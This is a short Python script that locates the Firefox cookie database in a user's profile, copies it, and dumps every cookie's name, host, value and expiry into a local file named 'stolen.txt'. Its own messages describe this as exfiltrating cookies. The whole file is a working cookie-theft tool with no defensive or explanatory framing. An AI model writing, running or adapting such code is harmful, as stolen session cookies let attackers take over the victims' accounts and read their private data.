import os, sys, sqlite3, shutil

def find_db(_path):
    # Walk through all directories and subdirectories
    for root, dirs, files in os.walk(_path):
        if 'cookies.sqlite' in files:
            # If found, return the full path
            return os.path.join(root, 'cookies.sqlite')
    
    # generic error if database not found
    raise FileNotFoundError("cookies.sqlite not found")
    
def main():
    dump = []
    
    # confirm firefox root directory exists
    try:
        ff = os.path.expanduser("~/.mozilla/firefox/")
    
        if not os.path.exists(ff):
            sys.exit('\r\nFirefox does not appear to be installed...\r\n')
    except Exception as ex:
        print(ex)
    
    # locate cookie database
    try:
        cookie_db = find_db(ff)
    except FileNotFoundError as e:
        sys.exit('\r\nCookie database not found!..\r\n')
        
    # make a copy to avoid access errors    
    cd = os.getcwd()
    clone = os.path.join(cd, os.path.basename(cookie_db))
    try:
        shutil.copy(cookie_db, clone)
    except:
        sys.exit('\r\nError copying database!')
    
    # attempt to query cookie info
    print('\r\nThis may take a moment...\r\n')
    
    try:
        # connect to cookiesException as e.sqlite
        conn = sqlite3.connect(clone)
        cursor = conn.cursor()
    
        # query all urls
        cursor.execute("SELECT id, name, host, value, expiry FROM moz_cookies;")
    
        # get results
        rows = cursor.fetchall()
    
        # close db
        conn.close()
    
        # verbose output
        for row in rows:
            input = f"ID: {row[0]} | Name: {row[1]} | Host: {row[2]} | Value: {row[3]} | Expiry: {row[4]}"
            
            # add to list
            dump.append(input)
    
    except sqlite3.Error as e:
        sys.exit(f"\r\nSQLite error: {e}")
        
    # delete cloned cookies.sqlite
    try:
        os.remove(clone)
    except:
        pass
    
    # dump to textfile
    try:
        with open("stolen.txt", "w") as file:
            for cookie in dump:
                file.write(cookie + "\n")
    except:
        sys.exit('\r\nError exfiltrating cookies!..\r\n')
        
    sys.exit('\r\nDone!\r\n')

if __name__ == '__main__':
    main()